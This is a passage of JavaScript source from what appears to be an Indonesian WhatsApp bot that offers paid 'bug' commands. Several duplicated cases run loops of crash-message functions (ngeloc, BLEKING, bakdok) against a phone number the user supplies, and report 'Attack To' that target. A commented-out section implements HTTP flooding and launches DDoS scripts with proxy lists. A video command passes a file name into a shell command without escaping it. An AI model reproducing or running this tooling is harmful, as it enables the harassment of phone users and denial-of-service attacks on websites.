║ ​᭄ 𝗝𝗶𝗸𝗮 𝗧𝗲𝘁𝗮𝗽 𝗖𝗲𝗻𝘁𝗮𝗻𝗴 𝟮 𝗠𝗮𝗸𝗮 𝘀𝗲𝗱𝗮𝗻𝗴 𝗱𝗲𝗹𝗮𝘆 𝗺𝗮𝗸𝗲𝗿
║ ​᭄ 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗸𝗶𝘁𝗮𝗿 𝟱-𝟭𝟬 𝗺𝗲𝗻𝗶𝘁 𝗷𝗶𝗸𝗮 𝘄𝗼𝗿𝗸 𝘄𝗮𝗷𝗶𝗯 𝘁𝗮𝗴 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲
║​᭄ 𝗝𝗶𝗸𝗮 𝗧𝗶𝗱𝗮𝗸 𝗪𝗼𝗿𝗸 𝗔𝘁𝗮𝘂 𝗚𝗮𝗴𝗮𝗹 𝗖𝗼𝗯𝗮 𝗟𝗮𝗴𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗬𝗮𝗻𝗴 𝗟𝗮𝗶𝗻 ᬊ
│
│ೄྀ 𝗖𝟭 𝗪𝗔𝗝𝗜𝗕 𝗦𝗧𝗢𝗥 𝗞𝗘 6289526156543
║
║ ================== 🌷
│
╰━━━━━━━━━━━━━━━━━━━━ᬼ`
reply(teksbang)
}
break

case 'superdupelcici': {
if (!isPremium) return reply(mess.only.premium)
let teksbang = `
𝖀𝖓𝖙𝖚𝖐 𝕭𝖚𝖌 𝕻𝖎𝖑𝖎𝖍 𝖄𝖆𝖆
(𝗨𝗻𝘁𝘂𝗸 𝗕𝘂𝗴 𝗣𝗶𝗹𝗶𝗵 𝗬𝗮𝗮)

 令 .𝘂𝗶𝘀𝘆𝘀𝘁𝗲𝗺 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝗱𝗲𝘃𝗶𝗰𝗲 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝘂𝗶𝗰𝗿𝗮𝘀𝗵 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝗯𝘂𝗴𝘂𝗶 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝗺𝗲𝗺𝗲𝗸 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 
 ☝ ＡＤＡ ５ ＰＩＬＩＨＡＮ ＢＵＡＴ ＢＵＧ ☝
 
╭━━━━━━━━━━━━━━ᬼ
│
║ ​᭄ 𝗝𝗶𝗸𝗮 𝗧𝗲𝘁𝗮𝗽 𝗖𝗲𝗻𝘁𝗮𝗻𝗴 𝟮 𝗠𝗮𝗸𝗮 𝘀𝗲𝗱𝗮𝗻𝗴 𝗱𝗲𝗹𝗮𝘆 𝗺𝗮𝗸𝗲𝗿
║ ​᭄ 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗸𝗶𝘁𝗮𝗿 𝟱-𝟭𝟬 𝗺𝗲𝗻𝗶𝘁 𝗷𝗶𝗸𝗮 𝘄𝗼𝗿𝗸 𝘄𝗮𝗷𝗶𝗯 𝘁𝗮𝗴 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲
║​᭄ 𝗝𝗶𝗸𝗮 𝗧𝗶𝗱𝗮𝗸 𝗪𝗼𝗿𝗸 𝗔𝘁𝗮𝘂 𝗚𝗮𝗴𝗮𝗹 𝗖𝗼𝗯𝗮 𝗟𝗮𝗴𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗬𝗮𝗻𝗴 𝗟𝗮𝗶𝗻 ᬊ
│
│ೄྀ 𝗖𝟭 𝗪𝗔𝗝𝗜𝗕 𝗦𝗧𝗢𝗥 𝗞𝗘 6289526156543
║
║ ================== 🌷
│
╰━━━━━━━━━━━━━━━━━━━━ᬼ`
reply(teksbang)
}
break

case 'hdvid' :
case 'hdvideo': 
case 'vidiohd':
case 'tohd': 
case 'vidhd' : {
const { TelegraPh } = require('../database/lib//uploader');
const { exec } = require('child_process');
const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? kandiXD.user.jid : m.sender;
//const name = await kandiXD.getName(who);
const q = m.quoted ? m.quoted : m;
const mime = (q.msg || q).mimetype || '';
if (!mime) return m.reply(`Mana vidio nya bang?`);
reply(mess.wait);
const media = await kandiXD.downloadAndSaveMediaMessage(q);
const url = await TelegraPh(media);
const output = 'output.mp4'; // Nama file output
// Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);

  // Mengunggah video yang telah ditingkatkan resolusinya
  kandiXD.sendMessage(m.chat, { caption: `_Success To HD Video_`, video: { url: output }}, {quoted: m});
})
await sleep(60000)
fs.unlinkSync(output)
fs.unlinkSync(media)
}
break

case 'hdvid' :
case 'hdvideo': 
case 'vidiohd':
case 'tohd': 
case 'vidhd' : {
const { TelegraPh } = require('../database/lib//uploader');
const { exec } = require('child_process');
const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? kandiXD.user.jid : m.sender;
//const name = await kandiXD.getName(who);
const q = m.quoted ? m.quoted : m;
const mime = (q.msg || q).mimetype || '';
if (!mime) return m.reply(`Mana vidio nya bang?`);
reply(mess.wait);
const media = await kandiXD.downloadAndSaveMediaMessage(q);
const url = await TelegraPh(media);
const output = 'output.mp4'; // Nama file output
// Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);

  // Mengunggah video yang telah ditingkatkan resolusinya
  kandiXD.sendMessage(m.chat, { caption: `_Success To HD Video_`, video: { url: output }}, {quoted: m});
})
await sleep(60000)
fs.unlinkSync(output)
fs.unlinkSync(media)
}
break

case 'enc': case 'encrypt': case 'obfuscate':
{
if (!q) return reply(`Contoh ${prefix+command} const time = require('money')`)
let meg = await obfus(q)
reply(`${meg.result}`)
}
break
/*case 'dos': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1] * 1000
			if (args.length === 2 && url && !isNaN(time)) {
				let attack = () => {
					let totalRequests = 0
					let threads = []
					for (let j = 0; j < 6; j++) {
						threads.push(
							new Promise((resolve, reject) => {
								let interval = setInterval(() => {
									for (let j = 0; j < 100; j++) {
										fetch(url)
											.then(() => {
												totalRequests++
												console.log(`Attacking => ${url} Total Requests: ${totalRequests} Duration: ${time}`)
											})
											.catch(err => {})
									}
								}, 750)
								setTimeout(() => {
									clearInterval(interval)
									resolve()
								}, time)
							})
						)
					}

					Promise.all(threads)
						.then(() => console.log("Attack Complete"))
						.catch(err => console.error("Error In Attack:", err))
				}

				attack()
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format: Dos [Url] [Time]`)
			}
		}
		break
		case 'ddos': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/hentai.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format : Ddos [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'xc': {
			if (!isPremium) return reply(mess.only.premium);
			let [url, time, rate, thread, proxyFile] = q.split(" ");
			if (args.length === 5 && url && time && rate && thread && proxyFile) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju: ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/LC.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString());
					if (stdout) return console.log(util.format(stdout));
				});
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format: Xc [Url] [Time] [Rate] [Thread] [ProxyFile]`);
			}
		}
		break
		case 'mix': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/mix.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format : Mix [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'floods': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/floods.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format : Floods [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'ua': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/kilua.js ${url} ${time} ${thread} proxy.txt ${rate} ua.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format : Ua [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'xchrome': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/chromev3.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format Xchrome [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'tls': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/tls-arz.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format Tls [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'tlsbypass': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/tls-bypass.js ${url} ${time} ${rate} ${thread}`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format Tlsbypass [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'tlsv2': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/tls.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format Tlsv2 [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'bypass-cf': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/bypass.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format : Bypass-cf [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'tls-vip': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/tlsvip.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format Tls-vip [Url] [Time] [Thread] [Rate]`)
			}
		}
		break*/
		//END DDOS\\
case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-forger': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`Example: ${prefix + command} 62×××`)
let target = bijipler + '@s.whatsapp.net'
reply(bugres)
await reply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
await reply(`━━━━━━━巛 Ada biji lah 彡

🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃

┈┈┈┈▕▔╱▔▔▔━▁
┈┈┈▕▔╱╱╱👁┈╲▂▔▔╲
┈┈▕▔╱╱╱╱💧▂▂▂▂▂▂▏
┈▕▔╱▕▕╱╱╱┈▽▽▽▽▽
▕▔╱┊┈╲╲╲╲▂△△△△
▔╱┊┈╱▕╲▂▂▂▂▂▂╱
╱┊┈╱┉▕┉┋╲┈ KASHIAN 
┗━━━━━━━━━━━━━━━━━━┛
⌕ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐨 ⚊≫  ${target} ☠︎
⌥ 𝐓𝐲𝐩𝐞 𝐁𝐮𝐠 >> ${command} 
𝐒𝐜𝐫𝐢𝐩𝐭 𝐕 3.0 𝐌𝐞𝐦𝐚𝐧𝐠 𝐆𝐚𝐝𝐚 𝐎𝐛𝐚𝐭 ⃟🥶⃟
𝐒𝐮𝐜𝐜𝐞𝐬 𝐁𝐮𝐠 !!

_! 𝐉𝐢𝐤𝐚 𝐓𝐢𝐝𝐚𝐤 𝐂𝟏 𝐌𝐚𝐤𝐚 𝐃𝐞𝐥𝐚𝐲 𝐌𝐚𝐤𝐞𝐫 !_

[ 𝙺𝚊𝚕𝚘 𝚋𝚞𝚐 𝚘𝚛𝚊𝚗𝚐 𝚊𝚝𝚊𝚞 𝚋𝚞𝚕𝚕𝚢 𝚘𝚛𝚊𝚗𝚐 𝚓𝚊𝚗𝚐𝚊𝚗 𝚊𝚗𝚎𝚑 𝚊𝚗𝚎𝚑 𝚜𝚊𝚖𝚊 andra 𝙜𝙖𝙗𝙪𝙩𝙖𝙣 ] 🥶🥵`)
}
break

case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-forger': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`Example: ${prefix + command} 62×××`)
let target = bijipler + '@s.whatsapp.net'
reply(bugres)
await reply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
await reply(`━━━━━━━巛 Ada biji lah 彡

🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃

┈┈┈┈▕▔╱▔▔▔━▁
┈┈┈▕▔╱╱╱👁┈╲▂▔▔╲
┈┈▕▔╱╱╱╱💧▂▂▂▂▂▂▏
┈▕▔╱▕▕╱╱╱┈▽▽▽▽▽
▕▔╱┊┈╲╲╲╲▂△△△△
▔╱┊┈╱▕╲▂▂▂▂▂▂╱
╱┊┈╱┉▕┉┋╲┈ KASHIAN 
┗━━━━━━━━━━━━━━━━━━┛
⌕ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐨 ⚊≫  ${target} ☠︎
⌥ 𝐓𝐲𝐩𝐞 𝐁𝐮𝐠 >> ${command} 
𝐒𝐜𝐫𝐢𝐩𝐭 𝐕 3.0 𝐌𝐞𝐦𝐚𝐧𝐠 𝐆𝐚𝐝𝐚 𝐎𝐛𝐚𝐭 ⃟🥶⃟
𝐒𝐮𝐜𝐜𝐞𝐬 𝐁𝐮𝐠 !!

_! 𝐉𝐢𝐤𝐚 𝐓𝐢𝐝𝐚𝐤 𝐂𝟏 𝐌𝐚𝐤𝐚 𝐃𝐞𝐥𝐚𝐲 𝐌𝐚𝐤𝐞𝐫 !_

[ 𝙺𝚊𝚕𝚘 𝚋𝚞𝚐 𝚘𝚛𝚊𝚗𝚐 𝚊𝚝𝚊𝚞 𝚋𝚞𝚕𝚕𝚢 𝚘𝚛𝚊𝚗𝚐 𝚓𝚊𝚗𝚐𝚊𝚗 𝚊𝚗𝚎𝚑 𝚊𝚗𝚎𝚑 𝚜𝚊𝚖𝚊 andra 𝙜𝙖𝙗𝙪𝙩𝙖𝙣 ] 🥶🥵`)
}
break	

case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-forger':{
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`Example: ${prefix + command} 62×××`)
let target = bijipler + '@s.whatsapp.net'
reply(bugres)
await reply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
await reply(`━━━━━━━巛 Ada biji lah 彡

🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃

┈┈┈┈▕▔╱▔▔▔━▁
┈┈┈▕▔╱╱╱👁┈╲▂▔▔╲
┈┈▕▔╱╱╱╱💧▂▂▂▂▂▂▏
┈▕▔╱▕▕╱╱╱┈▽▽▽▽▽
▕▔╱┊┈╲╲╲╲▂△△△△
▔╱┊┈╱▕╲▂▂▂▂▂▂╱
╱┊┈╱┉▕┉┋╲┈ KASHIAN 
┗━━━━━━━━━━━━━━━━━━┛
⌕ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐨 ⚊≫  ${target} ☠︎
⌥ 𝐓𝐲𝐩𝐞 𝐁𝐮𝐠 >> ${command} 
𝐒𝐜𝐫𝐢𝐩𝐭 𝐕 3.0 𝐌𝐞𝐦𝐚𝐧𝐠 𝐆𝐚𝐝𝐚 𝐎𝐛𝐚𝐭 ⃟🥶⃟
𝐒𝐮𝐜𝐜𝐞𝐬 𝐁𝐮𝐠 !!

_! 𝐉𝐢𝐤𝐚 𝐓𝐢𝐝𝐚𝐤 𝐂𝟏 𝐌𝐚𝐤𝐚 𝐃𝐞𝐥𝐚𝐲 𝐌𝐚𝐤𝐞𝐫 !_

[ 𝙺𝚊𝚕𝚘 𝚋𝚞𝚐 𝚘𝚛𝚊𝚗𝚐 𝚊𝚝𝚊𝚞 𝚋𝚞𝚕𝚕𝚢 𝚘𝚛𝚊𝚗𝚐 𝚓𝚊𝚗𝚐𝚊𝚗 𝚊𝚗𝚎𝚑 𝚊𝚗𝚎𝚑 𝚜𝚊𝚖𝚊 andra 𝙜𝙖𝙗𝙪𝙩𝙖𝙣 ] 🥶🥵`)
}
break

case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-forger': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`Example: ${prefix + command} 62×××`)
let target = bijipler + '@s.whatsapp.net'
reply(bugres)
await reply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
await reply(`━━━━━━━巛 Ada biji lah 彡

🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃

┈┈┈┈▕▔╱▔▔▔━▁
┈┈┈▕▔╱╱╱👁┈╲▂▔▔╲
┈┈▕▔╱╱╱╱💧▂▂▂▂▂▂▏
┈▕▔╱▕▕╱╱╱┈▽▽▽▽▽
▕▔╱┊┈╲╲╲╲▂△△△△
▔╱┊┈╱▕╲▂▂▂▂▂▂╱
╱┊┈╱┉▕┉┋╲┈ KASHIAN 
┗━━━━━━━━━━━━━━━━━━┛
⌕ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐨 ⚊≫  ${target} ☠︎
⌥ 𝐓𝐲𝐩𝐞 𝐁𝐮𝐠 >> ${command} 
𝐒𝐜𝐫𝐢𝐩𝐭 𝐕 3.0 𝐌𝐞𝐦𝐚𝐧𝐠 𝐆𝐚𝐝𝐚 𝐎𝐛𝐚𝐭 ⃟🥶⃟
𝐒𝐮𝐜𝐜𝐞𝐬 𝐁𝐮𝐠 !!

